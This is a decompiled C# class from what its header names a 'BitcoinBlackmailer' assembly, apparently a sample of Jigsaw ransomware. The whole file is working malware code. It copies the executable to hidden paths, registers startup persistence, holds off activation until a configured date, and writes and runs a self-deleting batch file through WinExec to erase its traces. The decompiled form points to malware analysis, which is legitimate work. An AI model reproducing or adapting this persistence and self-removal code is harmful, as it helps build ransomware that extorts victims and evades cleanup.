// Decompiled with JetBrains decompiler
// Type: Main.Tools.Hacking
// Assembly: BitcoinBlackmailer, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=null
// MVID: 628485CE-1750-4702-9367-C5FFF8321F79
// Assembly location: C:\Users\IEUser\Desktop\clean\jigsaw-tamp2-cleaned.exe

using Main.Properties;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Main.Tools
{
  internal static class Hacking
  {
    internal static void InitSoftware(Config.StartModeType startMode, string arg)
    {
      if (startMode == Config.StartModeType.Debug)
      {
        int num1 = (int) Hacking.smethod_0(Resources.StartModeDebug);
      }
      else if (arg != null)
      {
        if (startMode == Config.StartModeType.DeleteItself)
        {
          arg = Hacking.smethod_1(arg, "?", " ");
          if (Hacking.smethod_2(arg) && Hacking.smethod_3(arg))
          {
            int num2 = 0;
            bool flag;
            do
            {
              string string_0 = Hacking.smethod_4(arg);
              string exeFolderPath = Hacking.smethod_6((object) Hacking.smethod_5(arg));
              // ISSUE: reference to a compiler-generated method
              // ISSUE: reference to a compiler-generated method
              // ISSUE: reference to a compiler-generated method
              flag = ((IEnumerable<Process>) Hacking.smethod_7(string_0)).FirstOrDefault<Process>((Func<Process, bool>) (p => Hacking.\u003C\u003Ec__DisplayClass0_0.smethod_2(Hacking.\u003C\u003Ec__DisplayClass0_0.smethod_1(Hacking.\u003C\u003Ec__DisplayClass0_0.smethod_0(p)), exeFolderPath))) != null;
              Hacking.smethod_8(100);
              ++num2;
            }
            while (flag && num2 < 100);
            Hacking.smethod_8(300);
            if (!flag)
              Hacking.smethod_9(arg);
          }
        }
        if (startMode == Config.StartModeType.ErrorMessage)
        {
          int num3 = (int) Hacking.smethod_10(Config.ErrorMessage, Config.ErrorTitle, MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }
        if (!Config.OnlyRunAfterSysRestart)
          return;
        Hacking.smethod_11(0);
      }
      else
      {
        string tempExePath = Config.TempExePath;
        if (Config.FinalExeRelativePath != null)
        {
          string string_1 = Hacking.smethod_14(Hacking.smethod_12(Environment.SpecialFolder.Startup), Hacking.smethod_13(Config.FinalExeRelativePath));
          Main.Tools.Windows.SetStartup(Config.StartupMethod);
          if (Hacking.smethod_16(Hacking.smethod_15(), Config.FinalExePath) || Hacking.smethod_16(Hacking.smethod_15(), string_1))
            return;
        }
        if (Hacking.ExeSmartCopy(Config.FinalExePath, true))
          Hacking.ExeSmartCopy(tempExePath, true);
        string string_1_1 = Hacking.smethod_1(Hacking.smethod_15(), " ", "?");
        Hacking.smethod_17(tempExePath, string_1_1);
        Hacking.smethod_11(0);
      }
    }

    internal static bool ExeSmartCopy(string targetExePath, bool overwrite)
    {
      if (Hacking.smethod_16(Hacking.smethod_15(), targetExePath))
        return false;
      Hacking.smethod_18(Hacking.smethod_6((object) Hacking.smethod_5(targetExePath)));
      Hacking.smethod_19(Hacking.smethod_15(), targetExePath, overwrite);
      return true;
    }

    internal static bool ShouldActivate() => DateTime.Now > Config.ActiveAfterDateTime;

    internal static void RemoveItself()
    {
      if (Config.StartMode == Config.StartModeType.Debug)
        Hacking.smethod_11(0);
      try
      {
        Main.Tools.Windows.RemoveStartupRegistry(Config.FinalExePath);
        foreach (string string_0 in new HashSet<string>()
        {
          Hacking.smethod_20(Config.FinalExePath),
          Hacking.smethod_20(Config.TempExePath),
          Config.WorkFolderPath
        })
        {
          try
          {
            if (Hacking.smethod_21(string_0))
              Hacking.smethod_22(string_0, true);
          }
          catch (Exception ex)
          {
          }
        }
        string str = Hacking.smethod_23(Hacking.smethod_20(Hacking.smethod_15()), "\\DeleteItself.bat");
        StreamWriter streamWriter = Hacking.smethod_25(str, false, Hacking.smethod_24());
        try
        {
          Hacking.smethod_26((TextWriter) streamWriter, ":del\r\n del \"{0}\"\r\nif exist \"{0}\" goto del\r\ndel %0\r\n", (object) Hacking.smethod_15());
        }
        finally
        {
          if (streamWriter != null)
            Hacking.smethod_27((IDisposable) streamWriter);
        }
        int num = (int) Hacking.WinExec(str, 0U);
      }
      catch
      {
      }
      finally
      {
        try
        {
          Hacking.smethod_11(0);
        }
        catch
        {
          Hacking.smethod_28();
        }
      }
    }

    [DllImport("kernel32.dll")]
    public static extern uint WinExec(string lpCmdLine, uint uCmdShow);

    static DialogResult smethod_0(string string_0) => MessageBox.Show(string_0);

    static string smethod_1(string string_0, string string_1, string string_2) => string_0.Replace(string_1, string_2);

    static bool smethod_2(string string_0) => Path.IsPathRooted(string_0);

    static bool smethod_3(string string_0) => File.Exists(string_0);

    static string smethod_4(string string_0) => Path.GetFileNameWithoutExtension(string_0);

    static DirectoryInfo smethod_5(string string_0) => Directory.GetParent(string_0);

    static string smethod_6(object object_0) => object_0.ToString();

    static Process[] smethod_7(string string_0) => Process.GetProcessesByName(string_0);

    static void smethod_8(int int_0) => Thread.Sleep(int_0);

    static void smethod_9(string string_0) => File.Delete(string_0);

    static DialogResult smethod_10(
      string string_0,
      string string_1,
      MessageBoxButtons messageBoxButtons_0,
      MessageBoxIcon messageBoxIcon_0)
    {
      return MessageBox.Show(string_0, string_1, messageBoxButtons_0, messageBoxIcon_0);
    }

    static void smethod_11(int int_0) => Environment.Exit(int_0);

    static string smethod_12(Environment.SpecialFolder specialFolder_0) => Environment.GetFolderPath(specialFolder_0);

    static string smethod_13(string string_0) => Path.GetFileName(string_0);

    static string smethod_14(string string_0, string string_1) => Path.Combine(string_0, string_1);

    static string smethod_15() => Application.ExecutablePath;

    static bool smethod_16(string string_0, string string_1) => string_0 == string_1;

    static Process smethod_17(string string_0, string string_1) => Process.Start(string_0, string_1);

    static DirectoryInfo smethod_18(string string_0) => Directory.CreateDirectory(string_0);

    static void smethod_19(string string_0, string string_1, bool bool_0) => File.Copy(string_0, string_1, bool_0);

    static string smethod_20(string string_0) => Path.GetDirectoryName(string_0);

    static bool smethod_21(string string_0) => Directory.Exists(string_0);

    static void smethod_22(string string_0, bool bool_0) => Directory.Delete(string_0, bool_0);

    static string smethod_23(string string_0, string string_1) => string_0 + string_1;

    static Encoding smethod_24() => Encoding.Default;

    static StreamWriter smethod_25(string string_0, bool bool_0, Encoding encoding_0) => new StreamWriter(string_0, bool_0, encoding_0);

    static void smethod_26(TextWriter textWriter_0, string string_0, object object_0) => textWriter_0.Write(string_0, object_0);

    static void smethod_27(IDisposable idisposable_0) => idisposable_0.Dispose();

    static void smethod_28() => Application.Exit();
  }
}
